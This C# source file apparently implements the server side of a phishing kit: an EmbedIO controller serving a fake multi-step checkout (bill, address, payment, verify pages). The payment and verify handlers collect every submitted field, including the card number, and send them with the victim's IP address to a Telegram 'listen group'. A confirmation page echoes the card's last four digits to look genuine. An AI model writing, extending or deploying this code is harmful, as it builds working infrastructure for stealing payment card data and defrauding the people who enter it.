using EmbedIO;
using EmbedIO.WebApi;
using EmbedIO.Routing;
using System.Collections.Specialized;
using System;

/**
 * https://github.com/unosquare/embedio
 * https://github.com/unosquare/embedio/wiki/Cookbook
 */
internal class CheckoutController : WebApiController
{
    private static readonly Logger logger = new($"{DateTime.UtcNow:yyyy-MM-dd}");

    [Route(HttpVerbs.Get, "/t")]
    public string GetText()
    {
        return $"{DateTime.UtcNow:yyyy-MM-dd HH:mm:ss}";
    }

    [Route(HttpVerbs.Get, "/tt")]
    public void GetBinaryText()
    {
        using var writer = HttpContext.OpenResponseText();
        writer.WriteAsync($"{DateTime.UtcNow:yyyy-MM-dd HH:mm:ss}");
    }

    //[Route(HttpVerbs.Get, "/assets/{filename}")]
    //public void GetAsset(string filename)
    //{
    //    string fullname = $"www/assets/{filename}";
    //    string extension = Path.GetExtension(fullname);
    //    var mimeType = MimeTypeMap.List.MimeTypeMap.GetMimeType(extension);
    //    if (mimeType.Count() > 0)
    //    {
    //        HttpContext.Response.Headers.Add("Content-Type", mimeType.First());
    //    }
    //    using var writer = HttpContext.OpenResponseStream();
    //    if (File.Exists(fullname))
    //        writer.Write(File.ReadAllBytes(fullname));
    //}

    [Route(HttpVerbs.Get, "/{PaymentId}/bill")]
    public void GetPage1(string PaymentId)
    {
        string fullname = $"www/1.html";
        using var writer = HttpContext.OpenResponseStream();
        if (File.Exists(fullname))
            writer.Write(File.ReadAllBytes(fullname));
    }

    [Route(HttpVerbs.Get, "/{PaymentId}/address")]
    public void GetPage2(string PaymentId)
    {
        string fullname = $"www/2.html";
        using var writer = HttpContext.OpenResponseStream();
        if (File.Exists(fullname))
            writer.Write(File.ReadAllBytes(fullname));
    }

    [Route(HttpVerbs.Post, "/{PaymentId}/payment")]
    public void GetPage3(string PaymentId, [FormData] NameValueCollection data)
    {
        string value = "";
        var keys = data.AllKeys;
        foreach (var key in keys)
        {
            value += $"\n{key} = {data[key]}";
        }
        value = value.Trim();
        Console.WriteLine(value);
        HttpContext.Session["content"] = value;

        string fullname = $"www/3.html";
        using var writer = HttpContext.OpenResponseStream();
        if (File.Exists(fullname))
            writer.Write(File.ReadAllBytes(fullname));
    }

    [Route(HttpVerbs.Post, "/{PaymentId}/verify")]
    public void GetPage4(string PaymentId, [FormData] NameValueCollection data)
    {
        var value = HttpContext.Session["content"]?.ToString();
        var keys = data.AllKeys;
        foreach (var key in keys)
        {
            value += $"\n{key} = {data[key]}";
        }
        if (value != null)
        {
            var remoteIp = HttpContext.Request.RemoteEndPoint.Address.MapToIPv4().ToString();
            var message = $"<code>{remoteIp}</code>\n{value.Trim()}";
            Console.WriteLine(message);
            TelegramClient.SendMessageToListenGroup(message, Telegram.Bot.Types.Enums.ParseMode.Html);
        }
        string fullname = $"www/4.html";
        if (!File.Exists(fullname)) return;
        using var writer = HttpContext.OpenResponseText();
        string responseText = File.ReadAllText(fullname);
        responseText = responseText.Replace("{{cardsuffix}}", data["ccnum"]?[^4..])
            .Replace("{{date}}", DateTime.Now.ToString("MMM/yyyy/dd"));
        writer.Write(responseText);
    }

}
